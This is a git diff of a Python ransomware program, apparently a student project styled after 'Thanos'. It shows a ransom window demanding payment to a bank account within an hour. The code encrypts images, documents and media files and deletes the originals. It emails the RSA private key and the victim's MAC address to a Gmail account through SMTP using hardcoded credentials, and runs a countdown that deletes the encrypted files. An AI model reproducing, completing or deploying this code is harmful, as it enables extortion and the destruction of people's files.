@@ -42,7 +42,7 @@ class MyTk:
         self.window.configure(background="black")
 
         self.l_text = tkinter.Label(self.window,
-                                    text="타노스 랜섬웨어에 감염되었다.\n1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.\n국민 786102-00-040854\npassword:",
+                                    text="타노스 랜섬웨어에 감염되었다.\n1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.\n국민 786102-00-040854\n",
                                     fg="red", bg="black", font='Helvetica 14 bold')
         self.l_text.pack()
 
@@ -52,11 +52,12 @@ class MyTk:
         self.l_input = tkinter.Label(self.window,
                                      text="password:",
                                      fg="red", bg="black", font='Helvetica 14 bold')
+        self.l_input.pack()
 
         self.password = tkinter.Entry(self.window)
         self.password.pack()
 
-        self.pwbutton = tkinter.Button(self.window, text="복호화", command=self.keySubmit)
+        self.pwbutton = tkinter.Button(self.window, text="복호화", command=self.keySubmit,disabledforeground='red')
         self.pwbutton.pack()
 
         self.thanos = tkinter.PhotoImage(file="../ui/face.png")
@@ -68,11 +69,15 @@ class MyTk:
         # input 창이나 pwbutton을 destroy 할 필요는 없다고 생각함
         # 틀린 시도를 해도 그냥 그대로 두어도 된다고 저번 회의때 얘기했었으니까!
         self.pw = str(self.password.get())
-        # self.l_input.destroy()
-        self.l_input = tkinter.Label(self.window, text="키가 입력되었다 => " + self.pw, fg="red", bg="black",
-                                     font="Helvetica 18 bold")
-        self.l_input.pack()
+
+        self.l_input.config(text=" 키 확인중 ... ")  # 이거 왜 안뜨는거지..?
+        self.pwbutton.config(state='disabled')
+
         self.parent and self.parent.checkPassword(self.pw)
+
+        self.pwbutton.config(state='normal')
+        self.l_input.config(text=" 틀린 키이다 ")
+
 
     def imageChange(self):
         # gif 출력
@@ -99,23 +104,32 @@ class MyTk:
         self.l_final = tkinter.Label(self.window, image=self.final_image)
         self.l_final.pack()
 
-        self.window.mainloop()
+        #self.window.mainloop()
 
-        sleep(50)
-        self.window.destroy()
+        #sleep(50)
+        #self.window.destroy()
 
         # 알아서 destory 안되는듯
+
+    def allRemovePrint(self):
+        self.l_thanos.pack_forget()
+        l_allremove = tkinter.Label(self.window, text="\n\nYour files are all deleted.\n\n",
+                                    fg="red", bg="black", font='Helvetica 16 bold')
+        l_allremove.pack()
+        sleep(3)
+        self.listwindow.destroy()
+        self.window.destroy()
 
     ###
 
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수
 def startTimer(gui, path, ext=None):
-    print("파일 삭제를 시작합니다")
+    print("타이머를 시작합니다")
 
     antdd_filelist = []
 
-    print("os.listdir(): \n", os.listdir())
+    #print("os.listdir(): \n", os.listdir())
     for name in os.listdir(path):
         if os.path.isfile(os.path.join(path, name)):
             if name.endswith('antdd'):
@@ -125,7 +139,7 @@ def startTimer(gui, path, ext=None):
 
     if len(antdd_filelist) == 0:
         print("파일이 존재하지 않습니다")
-        allRemovePrint(gui)
+        gui.allRemovePrint()
         return
 
     # gui/ 삭제될 파일 리스트 출력
@@ -141,16 +155,10 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
     ###
-    print("[" + ",".join(antdd_filelist) + "]")
+    #print("[" + ",".join(antdd_filelist) + "]")
 
-    clock(gui, 20, antdd_filelist)
+    clock(gui, 5, antdd_filelist)
 
-    '''
-    ### list gui 자동으로 삭제 ###
-    sleep(3)
-    gui.listWindow.destroy()
-    ###
-    '''
 
 
 # 타이머를 출력해주는 함수
@@ -170,20 +178,12 @@ def clock(gui, c, antdd_filelist):
     threading.Timer(1, clock, [gui, c, antdd_filelist]).start()
 
 
-# 모두 삭제되었을 때 GUI #혜연 11/22 추가
-def allRemovePrint(gui):
-    gui.l_thanos.pack_forget()
-    l_allremove = tkinter.Label(gui.window, text="\n\nYour files are all deleted.\n\n",
-                                fg="red", bg="black", font='Helvetica 16 bold')
-    l_allremove.pack()
-    sleep(3)
-    gui.window.destroy()
-
-
 def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.l_thanos.destroy()
     gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")
     gui.l_thanos.pack()
+
+    sleep(2)
 
     # 파일이 2개 이상일 경우
     if (len(remove_filelist) >= 2):
@@ -205,7 +205,7 @@ def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
         os.remove(remove_filelist[0])
         print("더 이상 삭제할 파일이 없습니다")
         gui.listWindow.destroy()
-        allRemovePrint(gui)
+        gui.allRemovePrint()
 
     gui.l_thanos.pack_forget()
     gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos, borderwidth=0, compound="center", highlightthickness=0)
@@ -282,7 +282,7 @@ class RealMain:
 
         # Mac 주소
         self.UUID = uuid.getnode()
-        print("UUID=", self.UUID)
+        print("\n내 pc의 mac 주소(메일 제목이 됨) : UUID=", self.UUID, '\n')
 
         # RSA : 키, 싸이퍼 생성
         self.random_generator = Random.new().read
@@ -303,7 +303,7 @@ class RealMain:
              'jpg', 'jpeg', 'png', 'gif',
              'mp3', 'wav', 'wma',
              'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
-        print("os.listdir(): \n", os.listdir())
+        #print("os.listdir(): \n", os.listdir())
         for name in os.listdir(path):
             if os.path.isfile(os.path.join(path, name)):
                 for i in extlist:
@@ -312,7 +312,7 @@ class RealMain:
                     else:
                         continue
 
-        print("filelist: \n", filelist)
+        #print("filelist: \n", filelist)
         return filelist
 
     def decListFiles(self, path):
@@ -322,15 +322,14 @@ class RealMain:
                 dec_filelist.append(name)
             else:
                 continue
-        print("dec_filelist: \n", dec_filelist)
+        #print("dec_filelist: \n", dec_filelist)
         return dec_filelist
 
     # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////실제로 실행되는 함수
     def run(self):
 
-        print("공개키는 : ", self.public_key)
-        print("비밀키는 : ", self.private_key)
-        print("test_input_key는 : ", str(self.test_input_key))  # 랜섬웨어 자체랑 관계 없음 다 지워버려야함
+        #print("공개키는 : ", self.public_key)
+        #print("비밀키는 : ", self.private_key)
 
         # smtp 로그인 후 비밀키 전송
         smtp = smtplib.SMTP('smtp.gmail.com', 587)
@@ -338,13 +337,13 @@ class RealMain:
         smtp.starttls()  # TLS 사용시 필요
         smtp.login('secureantdd@gmail.com', 'antdd1234')  # 확인은 이 계정에서!
 
-        msg = MIMEText(self.private_key.decode())  # 고유식별자번호 / RSA개인키 를 메세지로 전송함
-        msg['Subject'] = str(self.UUID)
+        msg = MIMEText(self.private_key.decode())  # RSA개인키 를 메세지로 전송함
+        msg['Subject'] = str(self.UUID) # 사용자의 Mac 주소를 제목으로 전송
         msg['To'] = 'secureantdd@gmail.com'
         smtp.sendmail('secureantdd@gmail.com', 'secureantdd@gmail.com', msg.as_string())
 
         smtp.quit()
-        print('메일보내기 성공')
+        print('\n생성된 private key 를 메일로 보내기 성공\n')
 
         enc_targetlist = self.listFiles(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
 
@@ -354,6 +353,8 @@ class RealMain:
             enc(self.key, PKCS1_OAEP.new(RSA.importKey(self.public_key)), enc_target,
                 out_filename=None)
             os.remove(enc_target)
+
+        print("\n암호화 성공\n")
 
         th1 = threading.Thread(target=startTimer, args=[self.myGui, os.getcwd()])
         th1.daemon = True
@@ -373,9 +374,7 @@ class RealMain:
         server.user('secureantdd@gmail.com')
         server.pass_('antdd1234')
 
-        print(server.list())
-
-        for i in range(len(server.list())):
+        for i in range(len(server.list()[1])):
             msg = server.retr(i + 1)[1]
             text = b'\n'.join(msg).decode()
             idx = text.find('Subject:')
@@ -386,37 +385,25 @@ class RealMain:
             # print("분석한 메일=>", i+1, "번째 메일 ,",uuid,"에게 온 메일, key=",key)
 
             if uuid == str(self.UUID):  # / 해당 호스트의 메일 찾음
-                print(uuid, "호스트로 키 확인 들어갑니다\n key = ", key)
-                if key==gui_input:
+                print(i + 1, "번째 메일입니다")
+                if key.strip()==gui_input.strip():
+                    print("뭐야 왜 동작안해")
                     for file in self.decListFiles(os.getcwd()):  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
                         dec(PKCS1_OAEP.new(RSA.importKey(self.private_key)), file, out_filename=None)
                         # 입력한 비밀키를 바탕으로 dec 근데 파라미터 private_key 아니고 input이여야하는데 encoding 문제배제하려고 일단은 private key 사용함 11/24
                     self.myGui.finalGui()
                     print("복호화 성공!")
-                    self.myGui.window.destroy()
+                    #self.myGui.window.destroy()
                     return
             # auto_remove 호출
             else:
                 print("\nself.test_input_key!=input")
-        '''
-        if (str(self.test_input_key) == gui_input):  # 이건 테스트용
-            # if (self.private_key == gui_input): # 메일 서버로 private key 연결해와야함
-                
-            for file in self.decListFiles(os.getcwd()):  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
-                dec(PKCS1_OAEP.new(RSA.importKey(self.private_key)), file, out_filename=None)
-                # 입력한 비밀키를 바탕으로 dec 근데 파라미터 private_key 아니고 input이여야하는데 encoding 문제배제하려고 일단은 private key 사용함 11/24
-            self.myGui.finalGui()
-        
-            # auto_remove 호출
-        else:
-            print("\nself.test_input_key!=input")
-        '''
 
 
 if __name__ == "__main__":
 
     # 테스트용 파일 생성하기...(복붙너무귀찮아서...)
-    for i in range(3):
+    for i in range(5):
         with open("test" + str(i) + '.txt', 'wb') as testfile:
             testfile.write('테스트입니다'.encode())
 
